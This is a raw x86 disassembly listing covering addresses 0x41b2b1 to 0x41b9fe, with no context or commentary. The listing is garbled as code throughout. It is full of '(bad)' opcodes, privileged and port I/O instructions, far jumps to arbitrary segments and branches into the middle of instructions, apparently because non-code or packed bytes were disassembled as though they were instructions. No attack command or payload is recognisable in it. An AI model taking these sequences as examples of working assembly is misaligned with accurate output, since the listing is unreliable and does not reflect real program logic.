  41b2b1:	inc    ebx
  41b2b2:	push   eax
  41b2b3:	jns    0x41b2e1
  41b2b5:	inc    edi
  41b2b6:	mov    ah,0xa0
  41b2b8:	(bad)
  41b2bb:	xor    al,0x40
  41b2bd:	test   al,0xa5
  41b2bf:	push   ecx
  41b2c0:	mov    eax,ds:0x1ffa8322
  41b2c5:	push   esp
  41b2c6:	dec    ebx
  41b2c7:	es ins DWORD PTR es:[edi],dx
  41b2c9:	movntq QWORD PTR [ecx+ecx*8+0x2c6ed264],mm7
  41b2d1:	mov    ebp,0x72ab711a
  41b2d6:	jne    0x41b2cd
  41b2d8:	outs   dx,BYTE PTR ds:[esi]
  41b2d9:	outs   dx,DWORD PTR ds:[esi]
  41b2da:	test   al,0x98
  41b2dc:	add    al,0x1e
  41b2de:	mov    esp,0x253a1d45
  41b2e3:	vmwrite ecx,DWORD PTR [esi+0x4cba24e6]
  41b2ea:	fnsave [edx-0x4c]
  41b2ed:	sub    al,0x41
  41b2ef:	mov    ebp,0x52e3b01f
  41b2f4:	test   DWORD PTR [edx],edx
  41b2f6:	and    ch,BYTE PTR [esi+0x5a445f1d]
  41b2fc:	lods   al,BYTE PTR ds:[esi]
  41b2fd:	dec    edx
  41b2fe:	adc    ebx,DWORD PTR [ebx+0x7d]
  41b301:	popf   
  41b302:	jp     0x41b2a1
  41b304:	jl     0x41b32e
  41b306:	and    DWORD PTR [edi],0xeee6bec4
  41b30c:	cmp    eax,DWORD PTR [esi-0x13246aca]
  41b312:	out    0x98,al
  41b314:	cmp    bl,0x30
  41b317:	jmp    0x531fdd66
  41b31c:	je     0x41b2b3
  41b31e:	aaa    
  41b31f:	jecxz  0x41b37f
  41b321:	ja     0x41b2cb
  41b323:	aaa    
  41b324:	popf   
  41b325:	mov    dl,0xc5
  41b327:	pop    ecx
  41b328:	int    0x1e
  41b32a:	sub    bh,BYTE PTR [eax-0x40a63b5b]
  41b330:	inc    esi
  41b331:	push   0xfdf76bd9
  41b336:	ss icebp 
  41b338:	ret    
  41b339:	mov    dl,ah
  41b33b:	inc    esp
  41b33c:	scas   eax,DWORD PTR es:[edi]
  41b33d:	xchg   esp,eax
  41b33e:	jecxz  0x41b347
  41b340:	loopne 0x41b305
  41b342:	mov    cl,dl
  41b344:	jmp    0xa1b15654
  41b349:	shl    DWORD PTR [ebx-0x52],cl
  41b34c:	jmp    0xa3c98602
  41b351:	mov    ah,0xdd
  41b353:	fadd   QWORD PTR [edx+0x6101f07]
  41b359:	sbb    esi,DWORD PTR [edi+eax*4]
  41b35c:	rol    ebx,1
  41b35e:	push   esp
  41b35f:	icebp  
  41b360:	add    DWORD PTR [ebx],0x5a9ab0b1
  41b366:	sbb    eax,0x52922ac
  41b36b:	dec    edx
  41b36c:	xchg   edx,eax
  41b36d:	xlat   BYTE PTR ds:[ebx]
  41b36e:	mov    eax,0xccc1d137
  41b373:	pusha  
  41b374:	(bad)  
  41b375:	pushf  
  41b376:	arpl   WORD PTR [ecx-0x3706485b],sp
  41b37c:	stos   BYTE PTR es:[edi],al
  41b37d:	in     eax,0xe8
  41b37f:	xor    ah,BYTE PTR [edi-0x5f]
  41b382:	(bad)  
  41b383:	std    
  41b384:	out    0xa0,eax
  41b386:	sub    eax,0xaa2fba2d
  41b38b:	mov    esi,0x89bd1871
  41b390:	push   es
  41b391:	adc    dh,BYTE PTR [eax+0x372d51b9]
  41b397:	dec    esp
  41b398:	push   0x66
  41b39a:	in     al,dx
  41b39b:	scas   al,BYTE PTR es:[edi]
  41b39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b39d:	lods   al,BYTE PTR ds:[esi]
  41b39e:	push   ecx
  41b39f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3a0:	lods   eax,DWORD PTR ds:[esi]
  41b3a1:	or     eax,DWORD PTR [edi+ecx*1-0xbbcecaf]
  41b3a8:	mov    cl,0xbb
  41b3aa:	jmp    0xfc0c7596
  41b3af:	pushf  
  41b3b0:	mov    bl,0x26
  41b3b2:	call   0x9c1a:0x9db6dfc4
  41b3b9:	enter  0x71fd,0xcd
  41b3bd:	scas   al,BYTE PTR es:[edi]
  41b3be:	shr    DWORD PTR [esi+0x62],1
  41b3c1:	mov    dh,0x10
  41b3c3:	add    ecx,DWORD PTR [esi]
  41b3c5:	lods   eax,DWORD PTR ds:[esi]
  41b3c6:	mov    ch,0x79
  41b3c8:	jbe    0x41b3c4
  41b3ca:	pop    ebx
  41b3cb:	mov    ah,0xca
  41b3cd:	out    dx,eax
  41b3ce:	cmc    
  41b3cf:	pslld  mm3,QWORD PTR [eax]
  41b3d2:	mov    edi,0x594bf63
  41b3d7:	inc    ecx
  41b3d8:	xchg   ebx,eax
  41b3d9:	aas    
  41b3da:	xchg   ecx,eax
  41b3db:	xor    dl,BYTE PTR [eax+0x31]
  41b3de:	sub    al,0xe0
  41b3e0:	pop    ss
  41b3e1:	dec    ebx
  41b3e2:	dec    esp
  41b3e3:	pop    edx
  41b3e4:	adc    bh,BYTE PTR [esi-0x3d]
  41b3e7:	mov    dl,0xcf
  41b3e9:	push   0xffffffba
  41b3eb:	test   BYTE PTR [esi],dh
  41b3ed:	cmp    cl,BYTE PTR [esi+0x6a1c3f1d]
  41b3f3:	test   esi,edi
  41b3f5:	inc    ebx
  41b3f6:	adc    eax,0x38c89394
  41b3fb:	inc    ecx
  41b3fc:	cmp    DWORD PTR [edi+0x14],0xce4c1326
  41b403:	adc    al,0xad
  41b405:	pop    ecx
  41b406:	lods   eax,DWORD PTR ds:[esi]
  41b407:	sbb    edx,0x95db6e9b
  41b40d:	jmp    0x41b40f
  41b40f:	scas   eax,DWORD PTR es:[edi]
  41b410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b411:	push   esp
  41b412:	inc    edx
  41b413:	pop    eax
  41b414:	mov    ebp,0x5a8ced48
  41b419:	mov    esi,0x4792f4e1
  41b41e:	jb     0x7872076b
  41b424:	mov    ebp,0x7a1f277b
  41b429:	jle    0x41b402
  41b42b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b42c:	add    al,dl
  41b42e:	retf   0x6eb4
  41b431:	cmp    eax,0xe3bfc04
  41b436:	pop    eax
  41b437:	pop    eax
  41b438:	push   0x77
  41b43a:	iret   
  41b43b:	loope  0x41b3f4
  41b43d:	dec    edx
  41b43e:	jb     0x41b461
  41b440:	push   ebp
  41b441:	jne    0x41b48d
  41b443:	jno    0x41b44d
  41b445:	test   al,0xb0
  41b447:	ror    BYTE PTR [ebp-0x37],cl
  41b44a:	sbb    ah,BYTE PTR [esi+0x2d75b8be]
  41b450:	xchg   ebx,eax
  41b451:	test   eax,0x1e934247
  41b456:	pushf  
  41b457:	(bad)  
  41b458:	retf   
  41b459:	mov    dl,0x17
  41b45b:	loope  0x41b43e
  41b45d:	sbb    DWORD PTR [edi+eax*2+0x188e4046],0xffffffa4
  41b465:	in     al,0x1a
  41b467:	test   DWORD PTR [ebx+0x1e],ebp
  41b46a:	mov    cl,bl
  41b46c:	lds    edi,FWORD PTR [ebx]
  41b46e:	(bad)  
  41b46f:	scas   eax,DWORD PTR es:[edi]
  41b470:	xor    eax,0xf439fe4f
  41b475:	das    
  41b476:	cmp    eax,0x4543ced4
  41b47b:	inc    ebx
  41b47c:	mov    edi,DWORD PTR [ebx]
  41b47e:	add    edi,0xfffffff9
  41b481:	inc    ecx
  41b482:	adc    ecx,DWORD PTR [ebx+ebp*2-0x2]
  41b486:	fwait
  41b487:	shr    ecx,0x34
  41b48a:	cmp    esi,DWORD PTR [eax]
  41b48c:	sub    ecx,DWORD PTR [edi+0x8139954]
  41b492:	xchg   edx,eax
  41b493:	mov    ecx,0xf2f98c2c
  41b498:	cmp    cl,bl
  41b49a:	mov    dh,0x53
  41b49c:	xchg   esi,eax
  41b49d:	nop
  41b49e:	xchg   ecx,eax
  41b49f:	(bad)  
  41b4a0:	and    edi,edi
  41b4a2:	and    WORD PTR [ebp-0x58],ax
  41b4a6:	jmp    0x3f2a1c1e
  41b4ab:	div    BYTE PTR [esi+eiz*1]
  41b4ae:	das    
  41b4af:	sbb    ebp,DWORD PTR [edi-0x3]
  41b4b2:	or     edx,esp
  41b4b4:	mov    al,0xa0
  41b4b6:	dec    esp
  41b4b7:	jp     0x41b52e
  41b4b9:	je     0x41b4fd
  41b4bb:	aad    0xfc
  41b4bd:	cdq    
  41b4be:	xlat   BYTE PTR ds:[ebx]
  41b4bf:	and    bh,dl
  41b4c1:	add    al,BYTE PTR [esi+0x22]
  41b4c4:	ss jmp 0x3a27:0xc3ad4106
  41b4cc:	mov    al,ds:0x9f0cd905
  41b4d1:	aam    0xc2
  41b4d3:	pop    es
  41b4d4:	pop    ds
  41b4d5:	or     al,BYTE PTR [ebp+0x1946438e]
  41b4db:	std    
  41b4dc:	outs   dx,DWORD PTR ds:[esi]
  41b4dd:	das    
  41b4de:	shl    DWORD PTR [ebp+0x24],0x27
  41b4e2:	jnp    0x41b55f
  41b4e4:	dec    ebp
  41b4e5:	cwde   
  41b4e6:	jp     0x41b510
  41b4e8:	inc    ebx
  41b4e9:	mov    esi,0xb0758d62
  41b4ee:	ficom  DWORD PTR [edi]
  41b4f0:	mov    ah,BYTE PTR [edx-0x7fa3d197]
  41b4f6:	mov    BYTE PTR [esi-0x33f1eb97],al
  41b4fc:	(bad)  
  41b4fd:	or     al,0x1
  41b4ff:	xchg   ebp,eax
  41b500:	mov    ds:0xd866863c,al
  41b505:	cmp    al,bl
  41b507:	jmp    0x6f1c3c1d
  41b50c:	addr16 cs cli 
  41b50f:	jmp    0x41b4ee
  41b511:	jp     0x41b58d
  41b513:	nop
  41b514:	call   0x24e8315f
  41b519:	jp     0x41b57b
  41b51b:	leave  
  41b51c:	add    al,0x0
  41b51e:	ds push 0xfffffff8
  41b521:	add    BYTE PTR [eax],dl
  41b523:	xchg   ecx,eax
  41b524:	ins    DWORD PTR es:[edi],dx
  41b525:	inc    edx
  41b526:	pop    ebx
  41b527:	and    edx,0xffffff8e
  41b52a:	jmp    0xb5464188
  41b52f:	xor    DWORD PTR [eax-0x18dddcb8],ecx
  41b535:	shr    BYTE PTR [ecx+0x63],1
  41b538:	mov    esi,0xf55093a1
  41b53d:	jecxz  0x41b536
  41b53f:	stos   DWORD PTR es:[edi],eax
  41b540:	out    dx,al
  41b541:	ins    BYTE PTR es:[edi],dx
  41b542:	gs dec ebp
  41b544:	mov    ds:0x70e07938,eax
  41b549:	cmp    al,0xce
  41b54b:	adc    ah,ch
  41b54d:	in     eax,dx
  41b54e:	ins    BYTE PTR es:[edi],dx
  41b54f:	sbb    ebp,edi
  41b551:	clc    
  41b552:	ins    BYTE PTR es:[edi],dx
  41b553:	adc    ah,BYTE PTR [ebp-0x42b2f5e7]
  41b559:	dec    edx
  41b55a:	pusha  
  41b55b:	xor    dh,BYTE PTR [eax]
  41b55d:	je     0x41b5de
  41b55f:	(bad)  
  41b560:	daa    
  41b561:	mov    DWORD PTR [ebx],0x6b4f1c9a
  41b567:	gs xchg ebp,eax
  41b569:	std    
  41b56a:	mov    bh,0xc4
  41b56c:	rcr    DWORD PTR [edi+0x27],0x68
  41b570:	ret    
  41b571:	gs push eax
  41b573:	pop    ebp
  41b574:	scas   al,BYTE PTR es:[edi]
  41b575:	cs es loop 0x41b539
  41b579:	fidiv  DWORD PTR [eax+0x5f]
  41b57c:	adc    esp,eax
  41b57e:	pop    eax
  41b57f:	hlt    
  41b580:	scas   eax,DWORD PTR es:[edi]
  41b581:	jne    0x41b553
  41b583:	loopne 0x41b5f8
  41b585:	int    0x70
  41b587:	cld    
  41b588:	add    esi,esi
  41b58a:	out    0xd6,eax
  41b58c:	mov    al,BYTE PTR [edx+0x51]
  41b58f:	out    0xef,eax
  41b591:	add    edi,DWORD PTR [edx-0x53d14c44]
  41b597:	xchg   edx,eax
  41b598:	in     al,0xd1
  41b59a:	or     al,0x32
  41b59c:	sub    ebx,DWORD PTR [edi-0x2f]
  41b59f:	enter  0xe11d,0x5b
  41b5a3:	inc    ebp
  41b5a4:	stc    
  41b5a5:	jo     0x41b5ab
  41b5a7:	or     eax,0x3ab1a4df
  41b5ac:	inc    esi
  41b5ad:	push   ebp
  41b5ae:	jae    0x41b608
  41b5b0:	mov    ebx,0x94b907c3
  41b5b5:	test   BYTE PTR [edi+0x16],cl
  41b5b8:	lods   al,BYTE PTR ds:[esi]
  41b5b9:	retf   0xa23d
  41b5bc:	pop    es
  41b5bd:	xchg   edi,eax
  41b5be:	pop    esp
  41b5bf:	test   eax,edi
  41b5c1:	xchg   ecx,eax
  41b5c2:	push   edx
  41b5c3:	mov    ?,eax
  41b5c5:	adc    ebp,ecx
  41b5c7:	pop    edx
  41b5c8:	pop    ecx
  41b5c9:	inc    edi
  41b5ca:	push   edi
  41b5cb:	clc    
  41b5cc:	xchg   ebx,eax
  41b5cd:	mov    DWORD PTR [edx+0x32],esi
  41b5d0:	dec    edi
  41b5d1:	call   0x480a:0x388853d5
  41b5d8:	shr    BYTE PTR [edx+0x63e4d92f],1
  41b5de:	scas   eax,DWORD PTR es:[edi]
  41b5df:	cmp    ch,BYTE PTR [eax+0x62]
  41b5e2:	sbb    DWORD PTR [esi],esp
  41b5e4:	cmp    eax,0x14320a63
  41b5e9:	out    0x6f,al
  41b5eb:	dec    eax
  41b5ec:	shl    BYTE PTR [edi+ecx*8+0x79],0x1e
  41b5f1:	or     eax,0x9f0ae410
  41b5f6:	add    al,0xa
  41b5f8:	jno    0x41b621
  41b5fa:	(bad)  
  41b5fc:	loope  0x41b635
  41b5fe:	sub    al,0x7a
  41b600:	lods   eax,DWORD PTR ds:[esi]
  41b601:	dec    edi
  41b602:	in     al,0x84
  41b604:	into   
  41b605:	mov    ecx,0xfdb24dff
  41b60a:	sub    bl,BYTE PTR [edi+edi*2]
  41b60d:	push   eax
  41b60e:	sar    al,0xa4
  41b611:	inc    ebx
  41b612:	(bad)  
  41b613:	out    dx,eax
  41b614:	cmp    bh,0x1
  41b617:	jbe    0x41b5b6
  41b619:	rol    DWORD PTR [ecx],0x48
  41b61c:	xchg   ecx,eax
  41b61d:	mov    esp,ecx
  41b61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b620:	or     BYTE PTR [edx],bh
  41b622:	ror    BYTE PTR cs:[ecx+0x46e02965],1
  41b629:	dec    edx
  41b62a:	jae    0x41b5b8
  41b62c:	mov    al,ds:0x9683b30e
  41b631:	jbe    0x41b66b
  41b633:	loope  0x41b644
  41b635:	mov    fs,WORD PTR [esp+edx*8]
  41b638:	aad    0x55
  41b63a:	aas    
  41b63b:	addr16 xchg edx,eax
  41b63d:	ret    0xec7a
  41b640:	sbb    ecx,DWORD PTR [ebx-0x5]
  41b643:	sbb    eax,0xece58ff8
  41b648:	mov    cl,0xb7
  41b64a:	cwde   
  41b64b:	adc    DWORD PTR [edi-0x20381f8f],ecx
  41b651:	iret   
  41b652:	and    ah,BYTE PTR [ebx-0x13fd8f]
  41b658:	jp     0x41b662
  41b65a:	mov    ecx,0x5f4e4f9a
  41b65f:	or     BYTE PTR [ebx+0x52],ah
  41b662:	jne    0x41b678
  41b664:	pop    DWORD PTR [eax+0x41]
  41b667:	or     eax,0x384e48ba
  41b66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b66d:	repnz or ebp,DWORD PTR es:[ebx+eax*2-0x7c186118]
  41b676:	mov    bh,0x69
  41b678:	ins    DWORD PTR es:[edi],dx
  41b679:	ja     0x41b64f
  41b67b:	cs out dx,eax
  41b67d:	sub    BYTE PTR [esi-0x3c706b2f],al
  41b683:	adc    BYTE PTR [edx-0x7f],dh
  41b686:	mov    DWORD PTR [ecx],esp
  41b688:	inc    esp
  41b689:	(bad)  
  41b68a:	mov    esp,0x70f4b3d9
  41b68f:	xchg   BYTE PTR [eax+eiz*8],bh
  41b692:	xchg   ebx,eax
  41b693:	push   cs
  41b694:	rol    eax,cl
  41b696:	mov    cl,0xf9
  41b698:	icebp  
  41b699:	(bad)  
  41b69a:	jbe    0x41b6dd
  41b69c:	daa    
  41b69d:	push   esp
  41b69e:	aaa    
  41b69f:	fld    DWORD PTR [ecx-0x60]
  41b6a2:	sbb    DWORD PTR [eax+0x12],edx
  41b6a5:	jno    0x41b6c5
  41b6a7:	in     eax,0xb0
  41b6a9:	dec    ebx
  41b6aa:	dec    edi
  41b6ab:	xchg   DWORD PTR [ecx+0x55],esp
  41b6ae:	pop    es
  41b6af:	inc    ebx
  41b6b0:	adc    BYTE PTR [ebp-0x40720959],dl
  41b6b6:	mov    BYTE PTR [ebp-0x66],dh
  41b6b9:	inc    ebx
  41b6ba:	fistp  QWORD PTR [esi+eiz*8]
  41b6bd:	in     eax,0xaf
  41b6bf:	mov    eax,ds:0x1a05b77a
  41b6c4:	pop    ecx
  41b6c5:	ret    
  41b6c6:	inc    edx
  41b6c7:	fwait
  41b6c8:	inc    edx
  41b6c9:	(bad)  
  41b6ca:	out    dx,eax
  41b6cb:	pop    ss
  41b6cc:	jp     0x41b6ce
  41b6ce:	xchg   edi,eax
  41b6cf:	pop    esp
  41b6d1:	addr16 (bad) 
  41b6d3:	xor    esi,DWORD PTR [edx]
  41b6d5:	sbb    eax,0x859bc896
  41b6da:	js     0x41b726
  41b6dc:	jno    0x41b662
  41b6de:	rcl    BYTE PTR [esi-0x20033e63],0x15
  41b6e5:	mov    bl,0x5d
  41b6e7:	and    BYTE PTR [esp+edi*1],0x29
  41b6eb:	adc    BYTE PTR ds:0x248db34,dh
  41b6f1:	repnz push esp
  41b6f3:	cmp    al,0x1c
  41b6f5:	sbb    eax,0x7d9470b3
  41b6fa:	dec    edi
  41b6fb:	jle    0x41b694
  41b6fd:	outs   dx,BYTE PTR ds:[esi]
  41b6fe:	adc    al,0x9e
  41b700:	cwde   
  41b701:	pop    eax
  41b702:	cld    
  41b703:	test   eax,0xc5ea9bf6
  41b708:	aaa    
  41b709:	outs   dx,DWORD PTR ds:[esi]
  41b70a:	inc    esp
  41b70b:	dec    esp
  41b70c:	repz fcomp QWORD PTR [esi]
  41b70f:	adc    ah,BYTE PTR [esi-0x32]
  41b712:	fs enter 0x7c1c,0x9f
  41b717:	jns    0x41b792
  41b719:	loop   0x41b70e
  41b71b:	push   edx
  41b71c:	call   0x6c0c766d
  41b721:	imul   ebp,ebx,0x43dc5b9b
  41b727:	mov    al,0x95
  41b729:	and    al,ch
  41b72b:	imul   ebp,DWORD PTR [edi+0x68d07564],0xffffff8c
  41b732:	xchg   esi,eax
  41b733:	jbe    0x41b6ef
  41b735:	arpl   WORD PTR [edx+0x2fce584f],ax
  41b73b:	lock mov cl,0xc5
  41b73e:	ja     0x41b6ef
  41b740:	cmp    al,0xf6
  41b742:	pop    ds
  41b743:	sub    ebx,DWORD PTR [ebx+0x71be1e5f]
  41b749:	clc    
  41b74a:	mov    ebx,0x6e40b1c6
  41b74f:	cwde   
  41b750:	fmul   st(7),st
  41b752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b753:	adc    dl,BYTE PTR [eax]
  41b755:	ja     0x41b7ab
  41b757:	push   cs
  41b758:	mov    eax,0x3c1c261b
  41b75d:	adc    BYTE PTR [edx-0x14],dh
  41b760:	cmp    esp,DWORD PTR [ebx+0xc]
  41b763:	cdq    
  41b764:	mov    dl,0x80
  41b766:	call   0x175a:0xafe10db7
  41b76d:	push   esp
  41b76e:	pop    esi
  41b76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b770:	outs   dx,BYTE PTR ds:[esi]
  41b771:	pop    esi
  41b772:	inc    edx
  41b773:	inc    edi
  41b774:	imul   edi,DWORD PTR [esi+esi*8-0x62ecf623],0x9ec299ec
  41b77f:	cmp    DWORD PTR [edx+0x5fd95b6e],ecx
  41b785:	inc    esp
  41b786:	mov    dh,BYTE PTR [ebx]
  41b788:	mov    edi,0xdb002295
  41b78d:	pop    ss
  41b78e:	mov    cl,0xf6
  41b790:	loopne 0x41b803
  41b792:	xlat   BYTE PTR ds:[ebx]
  41b793:	test   eax,0xabbf9c9
  41b798:	out    dx,al
  41b799:	ins    BYTE PTR es:[edi],dx
  41b79a:	(bad)  
  41b79b:	popf   
  41b79c:	push   edi
  41b79d:	sbb    DWORD PTR [esi+0x47],0xfffffff8
  41b7a1:	or     eax,0xe3d9c5db
  41b7a6:	push   0xffffff9a
  41b7a8:	push   cs
  41b7a9:	xchg   esp,eax
  41b7aa:	and    eax,0x6f409b4
  41b7af:	popf   
  41b7b0:	add    BYTE PTR [esi],0xec
  41b7b3:	xchg   DWORD PTR [edi],ebx
  41b7b5:	push   esi
  41b7b6:	ja     0x41b813
  41b7b8:	out    dx,eax
  41b7b9:	dec    edi
  41b7ba:	enter  0x4db8,0xe4
  41b7be:	pop    edi
  41b7bf:	pop    ecx
  41b7c0:	fnstenv [ebx+0x7]
  41b7c3:	(bad)  
  41b7c4:	sbb    DWORD PTR [edx+eax*1-0x6e],edi
  41b7c8:	mov    eax,ds:0x5922276
  41b7cd:	mov    ebx,0x6ccddb8e
  41b7d2:	adc    ebx,ebp
  41b7d4:	mov    BYTE PTR [ebx],cl
  41b7d6:	sub    al,0xd4
  41b7d8:	enter  0xb65c,0xf5
  41b7dc:	mov    eax,eax
  41b7de:	add    DWORD PTR [esi-0x6],esp
  41b7e1:	dec    esp
  41b7e2:	inc    ecx
  41b7e3:	adc    al,0x3b
  41b7e5:	or     al,0xd6
  41b7e7:	fld    TBYTE PTR [eax+edi*4]
  41b7ea:	pusha  
  41b7eb:	loope  0x41b85f
  41b7ed:	aam    0xf9
  41b7ef:	adc    al,0x60
  41b7f1:	sub    ebx,edx
  41b7f3:	jno    0x41b7f0
  41b7f5:	xchg   eax,esi
  41b7f7:	pop    ebx
  41b7f8:	jmp    0x41b81d
  41b7fa:	mov    cl,bh
  41b7fc:	xor    edx,DWORD PTR [ebp-0x78]
  41b7ff:	imul   esi,edx,0xe84971a3
  41b805:	ficomp WORD PTR [ecx-0x5e0e9ba0]
  41b80b:	in     al,0x2e
  41b80d:	xor    eax,0xefc7f8d7
  41b812:	ins    DWORD PTR es:[edi],dx
  41b813:	ficomp WORD PTR [edx]
  41b815:	inc    ebx
  41b816:	mov    esi,0xc97e3a00
  41b81b:	inc    esi
  41b81c:	(bad)  
  41b81e:	cmp    DWORD PTR [ebx],eax
  41b820:	jmp    0x2044:0x40e752e9
  41b827:	mov    esp,0xe649d546
  41b82c:	push   edi
  41b82d:	in     al,0xde
  41b82f:	push   cs
  41b830:	(bad)  
  41b831:	fcomip st,st(3)
  41b833:	hlt    
  41b834:	push   cs
  41b835:	(bad)  
  41b836:	(bad)  
  41b838:	inc    edi
  41b839:	add    eax,0xe41f0cd3
  41b83e:	mov    ds:0x1511fa98,al
  41b843:	fs daa 
  41b845:	outs   dx,DWORD PTR ds:[esi]
  41b846:	(bad)  
  41b847:	aam    0xb4
  41b849:	and    ebp,DWORD PTR [ebp+edx*4-0x23]
  41b84d:	data16 xor BYTE PTR [edi-0x58c105da],al
  41b854:	inc    esi
  41b855:	(bad)  
  41b856:	pop    ebp
  41b857:	stc    
  41b858:	mov    dh,0x2b
  41b85a:	outs   dx,DWORD PTR ds:[esi]
  41b85b:	ficom  WORD PTR [esi-0xfb6499c]
  41b861:	inc    edx
  41b862:	ror    BYTE PTR [edi],0x21
  41b865:	aam    0xfd
  41b867:	or     cl,BYTE PTR [ecx+0x6d]
  41b86a:	std    
  41b86b:	sub    eax,0x5f5aa151
  41b870:	push   ebx
  41b871:	fld    QWORD PTR [ecx-0x3f0c5a1e]
  41b877:	ins    BYTE PTR es:[edi],dx
  41b878:	or     BYTE PTR [ebp-0x2e],ah
  41b87b:	daa    
  41b87c:	je     0x41b879
  41b87e:	call   0x4366:0xb60d480a
  41b885:	adc    al,BYTE PTR [edx+0x28]
  41b888:	rcr    BYTE PTR [esi+0xf],cl
  41b88b:	mov    ds:0xe3946d24,eax
  41b890:	cld    
  41b891:	lds    esp,FWORD PTR [ebx]
  41b893:	scas   eax,DWORD PTR es:[edi]
  41b894:	js     0x41b843
  41b896:	fild   WORD PTR [ecx+0x43]
  41b899:	repz loop 0x41b8ff
  41b89c:	mov    ebx,0xa76a90b8
  41b8a1:	fld    QWORD PTR [edi+0x2c]
  41b8a4:	mov    ebp,0xffef47a8
  41b8a9:	repnz pop esp
  41b8ab:	mov    ds:0x240d2d96,al
  41b8b0:	imul   esp,ebx,0x5521a355
  41b8b6:	sahf   
  41b8b7:	(bad)  
  41b8b8:	dec    eax
  41b8b9:	stos   DWORD PTR es:[edi],eax
  41b8ba:	xor    al,0xe7
  41b8bc:	fdiv   DWORD PTR [ebx]
  41b8be:	pop    ecx
  41b8bf:	ror    BYTE PTR [edx-0xb],0x2e
  41b8c3:	pop    esi
  41b8c4:	push   ds
  41b8c5:	inc    esi
  41b8c6:	retf   
  41b8c7:	sbb    ebp,DWORD PTR [ebx]
  41b8c9:	add    al,0x78
  41b8cb:	repz sub DWORD PTR [edx],ecx
  41b8ce:	and    edx,esp
  41b8d0:	lods   eax,DWORD PTR ds:[esi]
  41b8d1:	aam    0xff
  41b8d3:	mov    eax,0x2608764b
  41b8d8:	hlt    
  41b8d9:	popf   
  41b8da:	inc    esp
  41b8db:	jno    0x41b8a2
  41b8dd:	imul   esp,DWORD PTR [eax-0x65],0x29e9a414
  41b8e4:	enter  0x88c7,0x1e
  41b8e8:	mov    bh,0x4c
  41b8ea:	pop    edi
  41b8eb:	js     0x41b8b6
  41b8ed:	rol    BYTE PTR ds:0xad1945b1,1
  41b8f3:	mov    DWORD PTR [ebx-0x5f],esi
  41b8f6:	mov    ds:0xba2623dc,al
  41b8fb:	frstor [eax-0x16]
  41b8fe:	or     esp,DWORD PTR [ebx+0x50]
  41b901:	xor    bl,BYTE PTR ds:0x21080200
  41b907:	imul   esi,eax,0x9f91413b
  41b90d:	push   cs
  41b90e:	loope  0x41b8db
  41b910:	pusha  
  41b911:	jle    0x41b8ff
  41b913:	fs inc ecx
  41b915:	inc    ebx
  41b916:	ror    cl,cl
  41b918:	pop    edi
  41b919:	dec    edi
  41b91a:	outs   dx,BYTE PTR ds:[esi]
  41b91b:	add    al,0x6a
  41b91d:	jmp    0x5536:0xaec3f904
  41b924:	mov    dh,0xed
  41b926:	jmp    0x41b93a
  41b928:	retf   
  41b929:	and    esi,DWORD PTR [ecx]
  41b92b:	xchg   BYTE PTR [ebx+0x42],cl
  41b92e:	(bad)
  41b931:	jne    0x41b8f1
  41b933:	adc    al,0xc
  41b935:	int3   
  41b936:	sub    bh,ch
  41b938:	xchg   edi,eax
  41b939:	out    0x4a,al
  41b93b:	push   ds
  41b93c:	dec    ebx
  41b93d:	or     eax,0x9e7f791e
  41b942:	fwait
  41b943:	xor    BYTE PTR [ebx+ebx*1],ch
  41b946:	push   ecx
  41b947:	adc    bl,BYTE PTR [ebx+0x19]
  41b94a:	mov    dl,0x58
  41b94c:	clc    
  41b94d:	jno    0x41b9a2
  41b94f:	mov    ch,dl
  41b951:	jle    0x41b963
  41b953:	xchg   esi,eax
  41b954:	nop
  41b955:	popa   
  41b956:	push   esi
  41b957:	and    DWORD PTR [ecx],edi
  41b959:	xchg   DWORD PTR [edx-0x1271298d],edi
  41b95f:	add    eax,0x419ffe0f
  41b964:	rcr    ebx,1
  41b966:	fmul   st,st(5)
  41b968:	data16 aas 
  41b96a:	cmp    bl,BYTE PTR [eax]
  41b96c:	(bad)  
  41b96d:	enter  0x7e31,0xc6
  41b971:	or     al,0x15
  41b973:	xchg   ebp,eax
  41b974:	je     0x41b963
  41b976:	std    
  41b977:	scas   al,BYTE PTR es:[edi]
  41b978:	enter  0xca07,0x2a
  41b97c:	cmp    DWORD PTR [ebx+0x589542df],esi
  41b982:	lea    eax,[edx-0x58e628b]
  41b988:	pop    esi
  41b989:	mov    ebp,0x2606ebc7
  41b98e:	pop    es
  41b98f:	add    dl,0xce
  41b992:	push   0x3e710d91
  41b997:	xor    cl,BYTE PTR [ebx]
  41b999:	pushf  
  41b99a:	(bad)  
  41b99b:	imul   edx,DWORD PTR ss:[esi+0x17],0xffffffb8
  41b9a0:	mov    ah,BYTE PTR [eax+ebx*4]
  41b9a3:	rcr    BYTE PTR [ecx+0x1ac961d2],0x6b
  41b9aa:	retf   
  41b9ab:	add    al,0xde
  41b9ad:	cmp    ecx,ecx
  41b9af:	mov    bl,0x24
  41b9b1:	fidiv  WORD PTR [edx]
  41b9b3:	fwait
  41b9b4:	adc    edx,DWORD PTR [edx-0x7a9a1096]
  41b9ba:	mov    DWORD PTR [ebx+0x2726e1fc],0xe92522b7
  41b9c4:	inc    edx
  41b9c5:	into   
  41b9c6:	push   esi
  41b9c7:	scas   eax,DWORD PTR es:[edi]
  41b9c8:	or     DWORD PTR [ebx-0x6036c275],edx
  41b9ce:	jp     0x41ba02
  41b9d0:	mov    esi,0x60ad49db
  41b9d5:	adc    DWORD PTR [edx],eax
  41b9d7:	pop    ebp
  41b9d8:	mov    eax,ds:0xae569c73
  41b9dd:	sar    DWORD PTR [edi],0x0
  41b9e0:	test   BYTE PTR [edx],0x38
  41b9e3:	sbb    al,0x42
  41b9e5:	ds (bad) 
  41b9e7:	cmc    
  41b9e8:	(bad)  
  41b9e9:	outs   dx,BYTE PTR ds:[esi]
  41b9ea:	xchg   ebp,eax
  41b9eb:	jge    0x41b999
  41b9ed:	and    BYTE PTR [esi+0x4d],0xee
  41b9f1:	add    eax,0xebb0d080
  41b9f6:	sub    DWORD PTR [eax-0x3a],ebx
  41b9f9:	sbb    al,0xa3
  41b9fb:	shl    dl,0xe9
  41b9fe:	sbb    BYTE PTR [esi+eiz*2+0x37],al
